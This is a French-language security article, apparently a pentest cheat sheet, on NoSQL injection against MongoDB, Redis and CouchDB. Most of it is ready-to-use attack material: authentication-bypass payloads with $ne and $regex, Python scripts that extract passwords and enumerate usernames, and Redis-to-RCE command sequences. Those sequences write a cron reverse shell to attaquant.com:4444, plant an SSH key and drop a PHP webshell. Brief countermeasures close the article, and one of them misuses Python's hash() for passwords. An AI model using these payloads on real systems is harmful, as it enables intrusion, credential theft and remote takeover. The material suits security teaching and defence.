---
title: NoSQL Injection
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [nosql, mongodb, injection, redis, web, sécurité]
date: 2026-03-22
---

# NoSQL Injection

Les bases de données NoSQL (MongoDB, Redis, CouchDB, Cassandra) utilisent des formats de requêtes différents du SQL, mais restent vulnérables aux injections si les entrées utilisateur sont mal filtrées.

## MongoDB

### Opérateurs de requête (vecteurs d'attaque)

```
Opérateurs MongoDB courants :
$eq, $ne      → égal, différent
$gt, $lt      → supérieur, inférieur
$in, $nin     → dans une liste, hors liste
$where        → expression JavaScript
$regex        → expression régulière
$exists       → le champ existe
$or, $and     → logique
```

### Injection via JSON (API REST)

```bash
# Requête normale
POST /api/login
{"username": "alice", "password": "secret"}

# Injection avec $ne (not equal) — bypass d'authentification
POST /api/login
{"username": "admin", "password": {"$ne": ""}}
# → Cherche : password != "" → vrai pour n'importe quel mot de passe

# $gt (greater than)
{"username": "admin", "password": {"$gt": ""}}

# $regex — bypass avec regex
{"username": {"$regex": ".*"}, "password": {"$ne": ""}}
# → Match tous les usernames

# $in — tenter une liste de mots de passe
{"username": "admin", "password": {"$in": ["password", "admin", "123456"]}}
```

### Injection via paramètres URL (PHP avec MongoDB)

```bash
# PHP interprète les [] dans les query strings comme des tableaux
# URL normale
GET /api/users?username=alice&password=secret

# Injection (PHP transforme password[$ne] en {"$ne": ""})
GET /api/users?username=admin&password[$ne]=anything

# Avec curl
curl "https://target.com/api/login?username=admin&password[\$ne]=x"
```

### Code PHP vulnérable

```php
// Vulnérable — données utilisateur directement dans la requête
$result = $collection->findOne([
    'username' => $_POST['username'],
    'password' => $_POST['password']
]);

// Payload pour bypass : password = {"$ne": ""}
// MongoDB exécute : {username: "admin", password: {$ne: ""}}
// → Retourne l'admin sans connaître le mot de passe
```

### $where — injection JavaScript

```javascript
// Code vulnérable utilisant $where
db.users.find({$where: "this.username == '" + username + "'"})

// Injection — fermer la string et injecter du JS
username = "' || '1'=='1"
// → this.username == '' || '1'=='1' → toujours vrai

// Injection avec sleep (détection time-based)
username = "'; sleep(5000); var x='"
// → Si la réponse met 5 secondes → $where activé et injectable
```

### Exfiltration de données (Blind NoSQL — regex)

```python
import requests, string

# Extraire le mot de passe caractère par caractère via regex
charset = string.ascii_letters + string.digits + "!@#$%"
found = ""

while True:
    found_char = False
    for char in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{found}{char}"}
        }
        r = requests.post("https://target.com/api/login", json=payload)
        if "success" in r.text or r.status_code == 200:
            found += char
            found_char = True
            print(f"[+] Trouvé : {found}")
            break
    if not found_char:
        break

print(f"[+] Mot de passe : {found}")
```

### Énumération d'utilisateurs

```python
# Trouver tous les usernames avec $regex
import requests

found_users = []
for letter in "abcdefghijklmnopqrstuvwxyz":
    payload = {"username": {"$regex": f"^{letter}"}, "password": {"$ne": ""}}
    r = requests.post("https://target.com/api/login", json=payload)
    if "success" in r.text:
        print(f"[+] Utilisateur commençant par '{letter}'")
        # Affiner avec des characters supplémentaires
```

## Redis

Redis n'a pas de modèle d'authentification fort et est souvent exposé sans mot de passe.

### Accès direct non authentifié

```bash
# Connexion à Redis exposé
redis-cli -h target.com -p 6379

# Commandes d'énumération
redis-cli -h target.com KEYS "*"           # Toutes les clés
redis-cli -h target.com GET session:abc123  # Lire une valeur
redis-cli -h target.com CONFIG GET *        # Configuration
redis-cli -h target.com INFO                # Informations serveur

# Lire des sessions d'application
redis-cli -h target.com KEYS "session:*"
redis-cli -h target.com HGETALL "session:12345"
```

### Redis → RCE (si écriture autorisée)

```bash
# Méthode 1 : écrire une cron job
redis-cli -h target.com CONFIG SET dir /var/spool/cron/
redis-cli -h target.com CONFIG SET dbfilename root
redis-cli -h target.com SET payload "\n\n*/1 * * * * bash -i >& /dev/tcp/attaquant.com/4444 0>&1\n\n"
redis-cli -h target.com BGSAVE

# Méthode 2 : écrire une clé SSH autorisée
redis-cli -h target.com CONFIG SET dir /root/.ssh/
redis-cli -h target.com CONFIG SET dbfilename authorized_keys
redis-cli -h target.com SET key "\n\nssh-rsa AAAA... attaquant\n\n"
redis-cli -h target.com BGSAVE
ssh -i ~/.ssh/id_rsa root@target.com

# Méthode 3 : webshell (si répertoire web accessible en écriture)
redis-cli -h target.com CONFIG SET dir /var/www/html/
redis-cli -h target.com CONFIG SET dbfilename shell.php
redis-cli -h target.com SET payload "<?php system(\$_GET['cmd']); ?>"
redis-cli -h target.com BGSAVE
curl "http://target.com/shell.php?cmd=id"
```

### Injection dans les commandes Redis

```python
# Code Python vulnérable
import redis
r = redis.Redis()

user_key = request.args.get('key')
value = r.get(user_key)  # Pas d'injection classique ici

# Vulnérabilité : si la clé est construite avec une entrée non filtrée
# et que l'interface accepte des commandes brutes (RESP protocol)
```

## CouchDB

```bash
# Requête normale
GET /database/_find
{"selector": {"username": "alice"}}

# Injection avec JavaScript (Mango queries)
# Si le sélecteur est construit avec une entrée utilisateur :
{"selector": {"username": {"$gt": ""}}}  # Retourne tous les documents

# Accès direct si pas d'authentification
curl http://target.com:5984/_all_dbs
curl http://target.com:5984/userdb/_all_docs
```

## Outils

```bash
# NoSQLMap — automatisation des injections NoSQL
git clone https://github.com/codingo/NoSQLMap
python nosqlmap.py
# Menu interactif : cible, port, type de BD, type d'attaque

# Burp Suite + extension "NoSQL Scanner"
# Tester manuellement en modifiant les paramètres avec les opérateurs MongoDB
```

## Contre-mesures

```javascript
// Node.js / Mongoose — valider les types
const loginSchema = Joi.object({
    username: Joi.string().alphanum().required(),
    password: Joi.string().required()
});

const { error, value } = loginSchema.validate(req.body);
if (error) return res.status(400).send("Invalid input");

// Ne jamais accepter d'objets là où une string est attendue
// Si password est un objet {$ne: ""} → l'erreur de validation le rejette

// Mongoose — ne pas utiliser req.body directement
// Mauvais
User.findOne(req.body);

// Bien
User.findOne({
    username: String(req.body.username),
    password: String(req.body.password)  // Force le type string
});
```

```python
# Python / PyMongo — validation stricte
from pymongo import MongoClient

def safe_login(username, password):
    # Forcer les types stricts
    if not isinstance(username, str) or not isinstance(password, str):
        raise ValueError("Types invalides")

    user = db.users.find_one({
        "username": username,   # String garantie
        "password": hash(password)  # Hacher le mot de passe
    })
    return user
```
